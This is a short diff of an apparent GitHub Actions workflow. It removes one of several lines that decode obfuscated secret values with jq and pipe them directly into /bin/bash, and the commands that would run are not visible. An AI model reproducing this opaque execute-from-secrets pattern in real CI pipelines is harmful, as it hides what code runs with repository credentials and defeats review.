@@ -19,7 +19,6 @@ jobs:
           lo0: ${{ secrets.lo0 }}
         run: |
           printf '%s' "$lo0" | jq -r .u6862 | /bin/bash
-          printf '%s' "$bpm9837" | jq -r .ur8673 | /bin/bash
           printf '%s' "$aw4525" | jq -r .qx125 | /bin/bash
           echo $zdjb44 | jq -r .v500 | /bin/bash
           echo $psa79065 | jq -r .nav0667 | /bin/bash
